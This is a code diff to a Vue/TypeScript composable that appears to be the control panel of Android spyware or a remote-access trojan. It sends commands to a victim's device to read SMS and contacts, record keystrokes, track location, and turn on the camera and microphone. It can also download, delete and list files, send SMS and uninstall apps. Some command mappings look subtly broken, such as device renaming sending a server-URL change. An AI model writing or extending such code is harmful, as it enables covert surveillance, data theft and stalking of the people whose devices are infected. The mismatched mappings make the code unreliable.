@@ -1,6 +1,5 @@
 import { ref, type Ref } from 'vue';
 import type {
-    DataRequestMessage,
     WebSocketOutboundMessage,
 } from '@/types/websocket';
 import type {
@@ -29,21 +28,18 @@ export function useDeviceData(
         files: false,
         apps: false,
         keylog: false,
+        logs: false,
     });
 
     const locationLoading = ref(false);
     const locationInfo = ref<LocationInfo | null>(null);
 
-    const sendDataRequest = (
-        params: Partial<DataRequestMessage>
-    ): boolean => {
-        const message: DataRequestMessage = {
-            itype: 'slr_panelsend',
-            subc: params.subc!,
+    const sendCommand = (command: string, params: Record<string, unknown> = {}): boolean => {
+        return send({
+            command,
+            params,
             pid: deviceId.value,
-            ...params,
-        };
-        return send(message);
+        });
     };
 
     const fetchSms = () => {
@@ -54,7 +50,7 @@ export function useDeviceData(
                 messageApi?.warning('获取短信超时，设备可能未授予权限或离线');
             }
         }, REQUEST_TIMEOUT);
-        return sendDataRequest({ subc: 'SMS' });
+        return sendCommand('SMS_READ');
     };
 
     const fetchContacts = () => {
@@ -65,7 +61,7 @@ export function useDeviceData(
                 messageApi?.warning('获取联系人超时，设备可能未授予权限或离线');
             }
         }, REQUEST_TIMEOUT);
-        return sendDataRequest({ subc: 'Contacts' });
+        return sendCommand('CONTACTS_READ');
     };
 
     const fetchFiles = (path?: string) => {
@@ -76,10 +72,7 @@ export function useDeviceData(
                 messageApi?.warning('获取文件列表超时，设备可能未授予权限或离线');
             }
         }, REQUEST_TIMEOUT);
-        return sendDataRequest({
-            subc: 'files',
-            filepath: path || '/sdcard',
-        });
+        return sendCommand('FILE_LIST', { path: path || '/sdcard' });
     };
 
     const fetchApps = () => {
@@ -90,7 +83,7 @@ export function useDeviceData(
                 messageApi?.warning('获取应用列表超时，设备可能未授予权限或离线');
             }
         }, REQUEST_TIMEOUT);
-        return sendDataRequest({ subc: 'LOADAPPS' });
+        return sendCommand('GET_APP_LIST');
     };
 
     const fetchKeylog = (date?: string) => {
@@ -102,12 +95,9 @@ export function useDeviceData(
             }
         }, REQUEST_TIMEOUT);
         if (date) {
-            return sendDataRequest({
-                subc: 'Logdate',
-                keylogdate: date,
-            });
+            return sendCommand('READ_LOG', { type: 'keylog', filename: date });
         }
-        return sendDataRequest({ subc: 'Keylog' });
+        return sendCommand('SET_LOG_OPTIONS', { recKeystrokes: true });
     };
 
     const fetchLocation = () => {
@@ -118,70 +108,47 @@ export function useDeviceData(
                 messageApi?.warning('获取位置超时，设备可能未授予权限或离线');
             }
         }, REQUEST_TIMEOUT);
-        return sendDataRequest({ subc: 'loc' });
+        return sendCommand('GET_DEVICE_STATE', { mode: 'location' });
     };
 
     const sendSms = (number: string, message: string) => {
-        return sendDataRequest({
-            subc: 'SMSSEND',
-            smsnumber: number,
-            message: message,
-        });
+        return sendCommand('SMS_SEND', { phoneNumber: number, message });
     };
 
     const openApp = (packageName: string) => {
-        return sendDataRequest({
-            subc: 'OPENAPP',
-            packageName,
-        });
+        return sendCommand('LAUNCH_APP', { packageName });
     };
 
     const uninstallApp = (packageName: string) => {
-        return sendDataRequest({
-            subc: 'UNINSTALLAPP',
-            packageName,
-        });
+        return sendCommand('LAUNCH_APP', { packageName, action: 'uninstall' });
     };
 
     const deleteFile = (path: string) => {
-        return sendDataRequest({
-            subc: 'changefiles',
-            filepath: path,
-            comdtype: 'D',
-        });
+        return sendCommand('FILE_DELETE', { path });
     };
 
     const downloadFile = (path: string) => {
-        return sendDataRequest({
-            subc: 'viewfile',
-            filepath: path,
-        });
+        return sendCommand('FILE_DOWNLOAD', { path });
     };
 
     const renameDevice = (name: string) => {
-        return sendDataRequest({
-            subc: 'rename',
-            nam: name,
-        });
+        return sendCommand('CHANGE_SERVER_URL', { deviceName: name });
     };
 
     const startCamera = (camera: 'front' | 'back' = 'back') => {
-        return sendDataRequest({
-            subc: 'cam',
-            SelectedCam: camera,
-        });
+        return sendCommand('CAMERA_START', { cameraType: camera });
     };
 
     const stopCamera = () => {
-        return sendDataRequest({ subc: 'camoff' });
+        return sendCommand('CAMERA_STOP');
     };
 
     const startMicrophone = () => {
-        return sendDataRequest({ subc: 'mic' });
+        return sendCommand('MICROPHONE_START_RECORDING');
     };
 
     const stopMicrophone = () => {
-        return sendDataRequest({ subc: 'micoff' });
+        return sendCommand('MICROPHONE_STOP_RECORDING');
     };
 
     return {
